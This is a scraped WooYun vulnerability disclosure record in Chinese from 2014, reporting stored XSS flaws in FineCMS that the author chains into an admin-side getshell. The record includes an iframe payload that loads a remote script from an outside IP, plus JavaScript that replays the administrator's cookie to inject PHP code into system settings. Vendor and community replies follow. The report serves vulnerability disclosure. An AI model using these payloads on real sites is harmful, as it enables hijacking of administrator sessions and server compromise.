{"id": 50737, "wybug_id": "wooyun-2014-076987", "wybug_title": " FineCMS 最新版存储型xss跨后台getshell和多处xss合集", "wybug_corp": "dayrui.com", "wybug_author": "menmen519", "wybug_date": "2014-09-23 12:02", "wybug_open_date": "2014-12-22 12:04", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["持久型", "黑盒测试技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-26：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-11-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-07：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-22：\t细节向公众公开  简要描述：  FineCMS 最新版xss跨后台getshell和多处xss合集，我知道这个厂商习惯性忽略，但是这只是一个开始，一个开始，开始........................... 详细说明：  首先我们演示一下第一个xss,通过这个xss，反弹后台getshell:第一步，我们注册一个用户，如果管理员审核通过，也就是说这个用户是个普通的正常用户我们去图片发表处：\n\n下来我们看看本页也能弹出来:\n\n下来我们去后台看看 是否能够弹出来：\n\n\n\nok 到这里我们已经看到了这个xss，肯定会引起管理员的审核：下来我们更换xss的payload：我们用iframe标签：加载远端jssrc='data:text/html;base64,<script src=http://10.65.10.70/shell.js ></script>'然后进行变性编码：sda'\"><iframe src='data:text/html;base64,PHNjcmlwdCBzcmM9aHR0cDovLzEwLjY1LjEwLjcwL3NoZWxsLmpzID48L3NjcmlwdD4=' >\n\n下来我们来编写这个js的内容:\nfunction ajax(){\t\t\t\tvar request = false;\t\t\t\tif(window.XMLHttpRequest) {\t\t\t\t\trequest = new XMLHttpRequest();\t\t\t\t} else if(window.ActiveXObject) {\t\t\t\t\tvar versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP', 'Msxml2.XMLHTTP.7.0', 'Msxml2.XMLHTTP.6.0', 'Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];\t\t\t\t\tfor(var i=0; i<versions.length; i++) {\t\t\t\t\t\ttry {\t\t\t\t\t\t\trequest = new ActiveXObject(versions[i]);\t\t\t \t\t\t\t\t\t} catch(e) {}\t\t\t  \t\t\t\t\t}\t\t\t  \t\t\t\t}\t\t\t  \t\t\t\treturn request;\t\t\t  \t\t\t}\t\t\tvar _x = ajax();\t\t\t  \t\t\tpostgo();\t\t\tfunction postgo() {\t\t\t  \t\t\t\tsrc=\"http://finecmstest.com/admin.php?c=system&m=index\";\t\t\t\tdata=\"page=0&data%5BSYS_DEBUG%5D=FALSE&data%5BSYS_KEY%5D=***&data%5BSYS_EMAIL%5D=admin%40admin.com&data%5BSYS_ATTACHMENT_DIR%5D=&data%5BSITE_EXPERIENCE%5D=%E7%BB%8F%E9%AA%8C%E5%80%BC%27%2Bphpinfo%28%29%2C%2F%2F&data%5BSITE_SCORE%5D=%E8%99%9A%E6%8B%9F%E5%B8%81&data%5BSITE_MONEY%5D=%E9%87%91%E9%92%B1&data%5BSITE_CONVERT%5D=10&data%5BSYS_LOG%5D=FALSE&data%5BSITE_ADMIN_CODE%5D=FALSE&data%5BSITE_ADMIN_PAGESIZE%5D=8&data%5BSYS_MEMCACHE%5D=TRUE&memcache%5Bhostname%5D=127.0.0.1&memcache%5Bport%5D=11211&data%5BSYS_CRON_QUEUE%5D=1&data%5BSYS_CRON_NUMS%5D=20&data%5BSYS_CRON_TIME%5D=300&submit=%E6%8F%90%E4%BA%A4\";\t\t\t\txhr_act(\"POST\",src,data);\t\t\t  \t\t\t}\t\t\t  \t\t\tfunction xhr_act(_m,_s,_a){\t\t\t\t_x.open(_m,_s,false);\t\t\t\t\t\t\t\tcookie = document.cookie;\t\t\t\tif(_m==\"POST\"){\t\t\t\t\t_x.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded\");\t\t\t\t\t_x.setRequestHeader(\"Cookie\",cookie);\t\t\t\t}\t\t\t  \t\t\t\t_x.send(_a);\t\t\t  \t\t\t\treturn _x.responseText;\t\t\t \t\t\t}\n这里首先贴两张图片：\n\n\n\n当管理员审核刚才的图片时候，就会中招：\n\nok证明到此为止 下来我们看看其他基础存储型xss：\n\n\n\n\n\n看见了没有 这里弹出来了\n\n应该还有好多地方.....................   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2014-09-23 12:20 厂商回复： 对应的字段你没有开启xss过滤，默认是关闭的 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-23 12:38 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  又开始了....    \n     2014-10-14 02:36 |    \t\t小龙 \t\t\t( 普通白帽子  |\t\t\t        Rank:1208 漏洞数:316        | 乌云有着这么一群人，在乌云学技术，去某数...)\t\t \n  厂商总是喜欢说\"对应的字段你没有开启xss过滤，默认是关\"  听了就恶心……    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}